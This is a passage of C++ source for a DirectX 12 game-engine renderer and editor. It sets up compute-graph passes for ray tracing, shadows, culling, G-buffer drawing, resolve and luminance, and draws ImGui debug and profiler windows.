/// <param name=""appState"">Pointer to Scmdl class instance (holding state/values for application)</param>
Renderer::Renderer(Engine::Core* engine, Engine::EventSystem* eventSystem, Engine::Constants* options, Engine::Log* log, Engine::D3DRenderer* renderer, Engine::D3DSwapChain* swapChain, Application* appState) :
	Engine::System(""Renderer"", eventSystem),
	mOptions(options),
	mLog(log),
	mRenderer(renderer),
	mSwapChain(swapChain),
	mAppState(appState)
{
	// Run in background
	EnableUpdater(Engine::Task::BACKGROUND_SYNC_REPEATING);

	// Create compute/render pipeline
	mPipeline = new Engine::ComputeGraph(engine);

	// Get whether to use HW ray tracing
	mUseHardwareRaytracing = options->Get<int>(""Renderer.RayTracing.Hardware"") == 0 ? false : true;		
	if (mUseHardwareRaytracing)
	{
		// Hardware ray tracer
		mRaytraceHWNode = new Engine::ComputeGraphNode(""Renderer::DXRPass"", eventSystem, [&]() -> void
			{
				Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

				context->Begin();

				mAppState->mGfxProfiler->BeginProfile(context, ""DXRPass"");
				mRaytracerPassHW->SetSources(mAppState->mScene);
				mRaytracerPassHW->Process(mRenderer->Heap(), context, mCamera.Read(), mAppState->mViewportWidth, mAppState->mViewportHeight);
				mAppState->mGfxProfiler->EndProfile(context, ""DXRPass"");

				context->Finish();
			});
	}
	else
	{
		// Compute ray tracer - acceleration structure generator
		mAccelerationNode = new Engine::ComputeGraphNode(""RayTracing::AccelerationStructure"", eventSystem, [&]() -> void
			{
				// TODO: Rebuild/refit TLAS here when needed (with re-initializing data from scene)
			});

		// Compute ray tracer - ray generator
		mRaygenNode = new Engine::ComputeGraphNode(""RayTracing::Raygen"", eventSystem, [&]() -> void
			{
				Engine::ComputeContext* context = mRenderer->GetComputeContext();

				context->Begin();

				mAppState->mGfxProfiler->BeginProfile(context, ""RayTracing::Raygen"");
				mAppState->mRaytracer->GetRayGenerator()->InitPrimaryRaysDevice(mAppState->mRaytracer->GetRayBuffer(mAppState->mPrimaryRayBuffer), context, mRenderer->Heap(), mCamera.Read(), mAppState->mViewportWidth, mAppState->mViewportHeight);
				mAppState->mGfxProfiler->EndProfile(context, ""RayTracing::Raygen"");

				context->Finish();
			});

		// Compute ray tracer - trace rays
		mRaytraceNode = new Engine::ComputeGraphNode(""RayTracing::Trace"", eventSystem, [&]() -> void
			{
				Engine::ComputeContext* context = mRenderer->GetComputeContext();

				context->Begin();

				mAppState->mGfxProfiler->BeginProfile(context, ""RayTracing::Trace"");
				mRaytracerPass->SetSources(mAppState->mPrimaryRayBuffer);
				mRaytracerPass->Process(mRenderer->Heap(), context, mAppState->mRenderNodes->GetBounds());
				mAppState->mGfxProfiler->EndProfile(context, ""RayTracing::Trace"");

				context->Finish();
			});
		mRaytraceNode->AddInput(mAccelerationNode);
		mRaytraceNode->AddInput(mRaygenNode);
	}

	// Prepare scenegraph render nodes into buffer (for rendering)
	mRenderNodesNode = new Engine::ComputeGraphNode(""Renderer::RenderNodesPass"", eventSystem, [&]() -> void
		{
			Engine::ComputeContext* context = mRenderer->GetComputeContext();

			context->Begin();

			mAppState->mRenderNodes->Process(context);

			context->Finish();
		});

	// Prepare material systems data into buffer (for rendering)
	mMaterialNode = new Engine::ComputeGraphNode(""Renderer::MaterialPass"", eventSystem, [&]() -> void
		{
			Engine::ComputeContext* context = mRenderer->GetComputeContext();

			context->Begin();

			// If anything in editor was changed - check whether the object has material component, if it has - material system needs to be updated for this change
			if (mAppState->mEditor->GetChangedFlag())
			{
				std::set<int> ids = mAppState->mScene->GetState()->GetSelection();
				for (std::set<int>::iterator it = ids.begin(); it != ids.end(); it++)
				{
					Engine::Entity* entity = mAppState->mScene->GetEntity(*it);
					if (entity->GameObject().Has<Engine::MaterialComponent>())
					{
						Engine::MaterialComponent* materialComponent = entity->GameObject().Get<Engine::MaterialComponent>();
						int materialID = materialComponent->GetMaterialID();

						SkyeCuillin::MaterialSystem::Material* material = mAppState->mMaterialSystem->GetMaterial(materialID);

						material->mDiffuseMap = materialComponent->GetDiffuseMap()->GetSRVIndex();
						if (material->mDiffuseMap == (unsigned int)-1)
						{
							material->mDiffuseMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::DIFFUSE]->GetSRVIndex();
						}

						material->mNormalsMap = materialComponent->GetNormalsMap()->GetSRVIndex();
						if (material->mNormalsMap == (unsigned int)-1)
						{
							material->mNormalsMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::NORMAL]->GetSRVIndex();
						}

						material->mMetallicMap = materialComponent->GetMetallicMap()->GetSRVIndex();
						if (material->mMetallicMap == (unsigned int)-1)
						{
							material->mMetallicMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::METALLIC]->GetSRVIndex();
						}

						material->mRoughnessMap = materialComponent->GetRoughnessMap()->GetSRVIndex();
						if (material->mRoughnessMap == (unsigned int)-1)
						{
							material->mRoughnessMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::ROUGHNESS]->GetSRVIndex();
						}

						mAppState->mMaterialSystem->UpdateMaterial(materialID);
					}
				}
			}

			mAppState->mMaterialSystem->Process(context);

			context->Finish();
		});

	// Render all shadow maps in lighting system that need to be updated
	mShadowRenderNode = new Engine::ComputeGraphNode(""Renderer::ShadowPass"", eventSystem, [&]() -> void
		{
			std::lock_guard<std::mutex> lock(mAppState->mRenderingMutex);

			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""ShadowPass"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				break;

			case Application::ViewportState::TEXTURED:
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mLightingSystem->Process(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mAppState->mRenderNodes->GetBounds());
				break;

			default:
				break;
			}
			mAppState->mGfxProfiler->EndProfile(context, ""ShadowPass"");

			context->Finish();
		});
	mShadowRenderNode->AddInput(mRenderNodesNode);
	mShadowRenderNode->AddInput(mMaterialNode);

	mCullingNode = new Engine::ComputeGraphNode(""Renderer::Culling"", eventSystem, [&]() -> void
		{
			if (mCamera.Read() == nullptr)
			{
				return;
			}

			std::lock_guard<std::mutex> lock(mAppState->mRenderingMutex);

			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""CullPassHiZ"");
			mCulling->SetBuffers(mAppState->mRenderNodes, mCamera.Read()->GetFrustum(), Engine::Culling::DEFAULT_CULLING_BUFFER, mCamera.Read());
			mCulling->Process(mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""CullPassHiZ"");

			mAppState->mGfxProfiler->BeginProfile(context, ""Hi-ZPass1"");
			//mHiZPass->Process(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
			mAppState->mGfxProfiler->EndProfile(context, ""Hi-ZPass1"");

			mAppState->mGfxProfiler->BeginProfile(context, ""Hi-ZPass2"");
			//mHiZPass->Process2(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
			mAppState->mGfxProfiler->EndProfile(context, ""Hi-ZPass2"");

			mAppState->mGfxProfiler->BeginProfile(context, ""CullPass"");
			// Occlusion culling
			//mCulling->SetBuffers(mAppState->mRenderNodes, mCamera.Read()->GetFrustum(), Engine::Culling::DEFAULT_CULLING_BUFFER, mCamera.Read(), mHiZPass->GetWidth(), mHiZPass->GetHeight(), mHiZPass->GetNumMiplevels());
			//mCulling->Process(mRenderer->Heap(), context, Engine::Culling::DEFAULT_CULLING_BUFFER, mHiZPass->GetBuffer());
			// Uncomment for Frustum culling only
			mCulling->SetBuffers(mAppState->mRenderNodes, mCamera.Read()->GetFrustum(), Engine::Culling::DEFAULT_CULLING_BUFFER);
			mCulling->Process(mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""CullPass"");

			context->Finish();
		});
	mCullingNode->AddInput(mRenderNodesNode);
	mCullingNode->AddInput(mMaterialNode);

	mDrawNode = new Engine::ComputeGraphNode(""Renderer::DrawPass"", eventSystem, [&]() -> void
		{
			std::lock_guard<std::mutex> lock(mAppState->mRenderingMutex);

			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""DrawPass"");

			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mWireframePass->Process(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mCulling);
				break;

			case Application::ViewportState::TEXTURED:
				mTexturedPass->Process(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mGBufferPass->Process(mCamera.Read(), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
				break;

			default:
				break;
			}

			mAppState->mGfxProfiler->EndProfile(context, ""DrawPass"");

			context->Finish();
		});
	mDrawNode->AddInput(mRenderNodesNode);
	mDrawNode->AddInput(mMaterialNode);
	mDrawNode->AddInput(mCullingNode);

	mReductionNode = new Engine::ComputeGraphNode(""Renderer::ReductionPass"", eventSystem, [&]() -> void
		{
			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""ReductionPass"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mMultisampling->SetSources(mWireframePass->GetBuffer(), mWireframePass->GetDepthBuffer());
				break;

			case Application::ViewportState::TEXTURED:
				mMultisampling->SetSources(mTexturedPass->GetBuffer(), mTexturedPass->GetDepthBuffer());
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mMultisampling->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER), mGBufferPass->GetDepthBuffer());
				break;

			default:
				break;
			}
			mMultisampling->Process(mCamera.Read(), mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""ReductionPass"");

			context->Finish();
		});
	mReductionNode->AddInput(mDrawNode);

	mResolveNode = new Engine::ComputeGraphNode(""Renderer::ResolvePass"", eventSystem, [&]() -> void
		{
			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""ResolvePass"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mResolve->SetSources(mWireframePass->GetBuffer(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				break;

			case Application::ViewportState::TEXTURED:
				mResolve->SetSources(mTexturedPass->GetBuffer(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				break;

			case Application::ViewportState::LIT_TEXTURED:
				mLightingPass->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::COLOR_BUFFER),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::DEPTH_BUFFER),
					mMultisampling->GetTilesCount(),
					mMultisampling->GetTiles(),
					mMultisampling->GetTileRecords(),
					mMultisampling->GetTileSamples());
				mLightingPass->Process(mCamera.Read(), mRenderer->Heap(), context);

				mAvgLuminance->SetSources(mLightingPass->GetOutput(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				mAvgLuminance->Process(mRenderer->Heap(), context, mAppState->mGfxProfiler->GetFrameTime());

				mResolve->SetSources(mLightingPass->GetOutput(),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::COLOR_BUFFER),
					mMultisampling->GetTiles(),
					mMultisampling->GetTilesCount(),
					mMultisampling->GetTileRecords(),
					mMultisampling->GetTileSamples(),
					mAvgLuminance->GetAvgLuminanceBuffer());
				break;

			case Application::ViewportState::LIT:
				mLightingPass->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::COLOR_BUFFER),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::DEPTH_BUFFER),
					mMultisampling->GetTilesCount(),
					mMultisampling->GetTiles(),
					mMultisampling->GetTileRecords(),
					mMultisampling->GetTileSamples());
				mLightingPass->Process(mCamera.Read(), mRenderer->Heap(), context, Engine::LightingPass::Mode::LIT);

				mAvgLuminance->SetSources(mLightingPass->GetOutput(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				mAvgLuminance->Process(mRenderer->Heap(), context, mAppState->mGfxProfiler->GetFrameTime());

				mResolve->SetSources(mLightingPass->GetOutput(),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::COLOR_BUFFER),
					mMultisampling->GetTiles(),
					mMultisampling->GetTilesCount(),
					mMultisampling->GetTileRecords(),
					mMultisampling->GetTileSamples(),
					mAvgLuminance->GetAvgLuminanceBuffer());
				break;

			default:
				break;
			}
			mResolve->Process(mCamera.Read(), mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""ResolvePass"");

			context->Finish();
		});
	mResolveNode->AddInput(mShadowRenderNode);
	mResolveNode->AddInput(mReductionNode);

	mRenderNode = new Engine::ComputeGraphNode(""Rendering"", eventSystem, [&]() -> void
		{
			std::lock_guard<std::mutex> lock(mAppState->mRenderingMutex);
			std::lock_guard<std::mutex> swapChainLock(mAppState->mSwapChainMutex);

			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();			

			mAppState->SetGraphicsContext(context);

			mAppState->mGfxProfiler->Reset(context);
			mAppState->mGfxProfiler->BeginProfile(context, ""Frame"");

			// No native resolve pass
			/*mAppState->mGfxProfiler->BeginProfile(context, ""NativeResolve"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mNativeResolvePass->SetSources(mWireframePass->GetBuffer(), mWireframePass->GetDepthBuffer());
				break;

			case Application::ViewportState::TEXTURED:
				mNativeResolvePass->SetSources(mTexturedPass->GetBuffer(), mTexturedPass->GetDepthBuffer());
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mNativeResolvePass->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER), mGBufferPass->GetDepthBuffer());
				break;

			default:
				break;
			}
			mNativeResolvePass->Process(mCamera.Read(), mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""NativeResolve"");*/

			// No gizmo pass
			/*context->TransitionResource(mSwapChain->GetBackBuffer(), D3D12_RESOURCE_STATE_RENDER_TARGET, true);
			context->SetRenderTargets(mSwapChain->GetBackBuffer(), mSwapChain->GetDepthBuffer());
			context->SetViewport(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->SetScissorRect(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->ClearColor(mSwapChain->GetBackBuffer(), 0.0f, 0.0f, 0.0f, 1.0f);
			context->ClearDepth(mSwapChain->GetDepthBuffer(), 1.0f, 0);

			std::set<int> ids;
			Engine::float4 basis[3] = { Engine::float4(1.0f, 0.0f, 0.0f, 1.0f), Engine::float4(0.0f, 1.0f, 0.0f, 1.0f), Engine::float4(0.0f, 0.0f, 1.0f, 1.0f) };
			mGizmoPass->Clear();
			//mGizmoPass->Process(nodes, mAppState->mScene, mMatricesBuffer, ids);
			//mGizmoPass->ProcessIcons(nodes);
			mGizmoPass->AddTranslationAxis(Engine::float4(0.0f, 0.0f, 0.0f, 1.0f), basis, 10.0f, -1, -1);
			mGizmoPass->Render(mCamera.Read(), mRenderer->Heap(), context);*/
			
			// Set output to back buffer - and perform imgui pass (output)
			context->SetDescriptorHeap(Engine::DescriptorHeap::CBV_SRV_UAV, mRenderer->Heap());
			context->TransitionResource(mSwapChain->GetBackBuffer(), D3D12_RESOURCE_STATE_RENDER_TARGET, true);
			context->SetRenderTargets(mSwapChain->GetBackBuffer(), mSwapChain->GetDepthBuffer());
			context->SetViewport(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->SetScissorRect(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->ClearColor(mSwapChain->GetBackBuffer(), 0.0f, 0.0f, 0.0f, 1.0f);
			context->ClearDepth(mSwapChain->GetDepthBuffer(), 1.0f, 0);

			// Draw Imgui user interface
			mImgui->Update(context, mAppState->mGfxProfiler->GetFrameTime() * 0.001f);
			mImgui->NewFrame();

			mAppState->mMenuUI->Process(mAppState->mWindowSize);


			// Create root imgui window for dockspace
			ImGuiViewport* viewport = ImGui::GetMainViewport();
			ImGui::SetNextWindowPos(ImVec2(0.0f, 0.0f));
			ImGui::SetNextWindowSize(ImVec2((float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y));
			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			ImGui::Begin(""Viewport"", nullptr, ImGuiWindowFlags_MenuBar | ImGuiWindowFlags_NoDocking | ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoBringToFrontOnFocus | ImGuiWindowFlags_NoNavFocus | ImGuiWindowFlags_NoBackground);
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			ImGuiID dockspace = ImGui::GetID(""Dockspace"");
			ImGui::DockSpace(dockspace, ImVec2(0.0f, 0.0f), ImGuiDockNodeFlags_None | ImGuiDockNodeFlags_PassthruCentralNode);

			mAppState->mEditorSettingsDialog->Process();

			ImGui::End();

			unsigned int regionWidth = mAppState->mWindowSize.x;
			unsigned int regionHeight = mAppState->mWindowSize.y;

			if (ImGui::Begin(""Debug""))
			{
				//ImGui::Image((ImTextureID)(mGBufferPass->GetBuffer(0)->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				//ImGui::Image((ImTextureID)(mWireframePass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				//ImGui::Image((ImTextureID)(mTexturedPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				//ImGui::Image((ImTextureID)(mNativeResolvePass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				if (mAppState->GetViewportState() == Application::ViewportState::LIT_TEXTURED || mAppState->GetViewportState() == Application::ViewportState::LIT)
				{
					//ImGui::Image((ImTextureID)(mLightingSystem->GetShadowMap()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
					ImGui::Image((ImTextureID)(mResolve->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				}
				else
				{
					//ImGui::Image((ImTextureID)(mHiZPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());				
					//ImGui::Image((ImTextureID)(mRaytracerPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
					ImGui::Image((ImTextureID)(mResolve->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				}

				ImVec2 regionMin = ImGui::GetWindowContentRegionMin();
				ImVec2 regionMax = ImGui::GetWindowContentRegionMax();

				regionWidth = (unsigned int)(regionMax.x - regionMin.x);
				regionHeight = (unsigned int)(regionMax.y - regionMin.y);

				if (regionWidth < 8)
				{
					regionWidth = 8;
				}

				if (regionWidth > 4096)
				{
					regionWidth = 4096;
				}

				if (regionHeight < 8)
				{
					regionHeight = 8;
				}

				if (regionHeight > 4096)
				{
					regionHeight = 4096;
				}
			}
			ImGui::End();

			if (mUseHardwareRaytracing)
			{
				if (ImGui::Begin(""Debug2""))
				{
					ImGui::Image((ImTextureID)(mRaytracerPassHW->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				}
				ImGui::End();
			}
			else
			{
				if (ImGui::Begin(""Debug2""))
				{
					ImGui::Image((ImTextureID)(mRaytracerPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				}
				ImGui::End();
			}

			if (ImGui::Begin(""Debug3""))
			{
				ImGui::Image((ImTextureID)(mLightingSystem->GetShadowMap()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
			}
			ImGui::End();

			if (ImGui::Begin(""Histogram""))
			{
				if (ImPlot::BeginPlot(""Histogram""))
				{
					float data[256];
					for (int i = 0; i < 256; i++)
					{
						data[i] = (float)(mAvgLuminance->GetHistogramHostBuffer()[i]);
					}

					ImPlot::SetupAxisScale(ImAxis_X1, ImPlotScale_Linear);
					ImPlot::SetupAxisLimits(ImAxis_X1, 0.0, 256.0);
					ImPlot::SetupAxisScale(ImAxis_Y1, ImPlotScale_Linear);
					ImPlot::SetupAxisLimits(ImAxis_Y1, 0.0, 1024.0);
					ImPlot::PlotLine(""Buckets"", data, 256);
					ImPlot::EndPlot();
				}
			}
			ImGui::End();

			if (ImGui::Begin(""AverageLuminance""))
			{
				ImGui::LabelText(""Average Luminance"", ""%f"", mAvgLuminance->GetAvgLuminanceHostBuffer()[0]);
				ImGui::LabelText(""Exposure"", ""%f"", mAvgLuminance->GetAvgLuminanceHostBuffer()[1]);
			}
			ImGui::End();

			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			if (ImGui::Begin(""Scenegraph"", nullptr, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBringToFrontOnFocus))
			{
				mAppState->mEditorScenegraph->ImguiScenegraphEditor();
			}
			ImGui::End();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			if (ImGui::Begin(""Edit"", nullptr, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBringToFrontOnFocus))
			{
				mAppState->mEditorComponent->ImguiSelectionEditor();
			}
			ImGui::End();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			if (ImGui::Begin(""Directory View"", nullptr, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBringToFrontOnFocus))
			{
				mAppState->mDirTree->Imgui();
			}
			ImGui::End();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			if (Engine::ComponentStatic::mEditedComponent != nullptr)
			{
				mAppState->mEditorManager->ImguiManagerList<Engine::Texture>(""Select Texture"", mAppState->mAssetManager->GetManager<Engine::Texture>());
			}

			static bool showProfiler = true;
			if (ImGui::Begin(""Profile"", &showProfiler))
			{
				char tmp[255] = { 0 };
				snprintf(tmp, sizeof(tmp), ""%f fps"", mAppState->mGfxProfiler->GetFramesPerSecond()); ImGui::LabelText(""FPS"", tmp);

				ImGui::Separator();

				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Frame"")); ImGui::LabelText(""Frame"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""ShadowPass"")); ImGui::LabelText(""ShadowPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Hi-ZPass1"")); ImGui::LabelText(""Hi-ZPass1"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""Hi-ZPass2"")); ImGui::LabelText(""Hi-ZPass2"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""CullPass"")); ImGui::LabelText(""CullPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""CullPassHiZ"")); ImGui::LabelText(""CullPassHiZ"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""DrawPass"")); ImGui::LabelText(""DrawPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""ReductionPass"")); ImGui::LabelText(""ReductionPass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""ResolvePass"")); ImGui::LabelText(""ResolvePass"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""NativeResolve"")); ImGui::LabelText(""NativeResolve"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""RayTracing::Raygen"")); ImGui::LabelText(""RayTracing::Raygen"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""RayTracing::Trace"")); ImGui::LabelText(""RayTracing::Trace"", tmp);
				snprintf(tmp, sizeof(tmp), ""%.2f ms"", mAppState->mGfxProfiler->GetTime(""DXRPass"")); ImGui::LabelText(""DXRPass"", tmp);
			}
			ImGui::End();

			mImgui->Render();

			context->TransitionResource(mSwapChain->GetBackBuffer(), D3D12_RESOURCE_STATE_PRESENT, true);

			mAppState->mGfxProfiler->EndProfile(context, ""Frame"");
			mAppState->mGfxProfiler->Resolve(context);

			mAppState->ReleaseGraphicsContext();

			// Finish recording command list, execute command list and wait for execution
			uint64_t fence = context->Finish();

			if (mAppState->mEditorSettingsDialog->IsChanged())
			{
				mAppState->mEditorSettingsDialog->ClearChanged();
				mImgui->SetupFonts(mRenderer);
			}

			mAvgLuminance->Readback();

			mTexturedPass->Readback();

			if (mAppState->mViewportWidth != regionWidth && mAppState->mViewportHeight != regionHeight)
			{
				mAppState->mViewportWidth = regionWidth;
				mAppState->mViewportHeight = regionHeight;

				mAppState->mResizeFlag = true;

				mWireframePass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mTexturedPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mGBufferPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				//mNativeResolvePass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mMultisampling->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mResolve->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				mLightingPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				if (mUseHardwareRaytracing)
				{
					mRaytracerPassHW->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				}
				else
				{
					mRaytracerPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);
				}
				mHiZPass->Resize(mAppState->mViewportWidth, mAppState->mViewportHeight);

				if (mUseHardwareRaytracing == false)
				{
					mAppState->mRaytracer->ResizeRayBuffer(mAppState->mPrimaryRayBuffer, mAppState->mViewportWidth* mAppState->mViewportHeight);
				}
			}
			else
			{
				mAppState->mResizeFlag = false;
			}

			if (mAppState->mBaseSignatureChanged == true)
			{
				mAppState->mBaseSignatureChanged = false;

				delete mAppState->mRenderNodes;
				switch (mAppState->GetViewportState())
				{
				case Application::ViewportState::WIREFRAME:
					mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mWireframePass->GetRootSignature(), nullptr, mHiZPass->GetRootSignature() });
					break;

				case Application::ViewportState::TEXTURED:
					mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mTexturedPass->GetRootSignature(), nullptr, mHiZPass->GetRootSignature() });
					break;

				case Application::ViewportState::LIT_TEXTURED:
				case Application::ViewportState::LIT:
					mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mGBufferPass->GetRootSignature(), mLightingSystem->GetRootSignature(), mHiZPass->GetRootSignature() });
					break;

				default:
					break;
				}
			}

			mAppState->mGfxProfiler->Process(""Frame"");

			// Swap buffers in swap chain and present to screen
			mSwapChain->SwapBuffers();

			if (mCamera.Read() != nullptr)
			{
				mAppState->mScene->Render(mRenderer, mCamera.Read(), mAppState->mRenderNodes);
			}

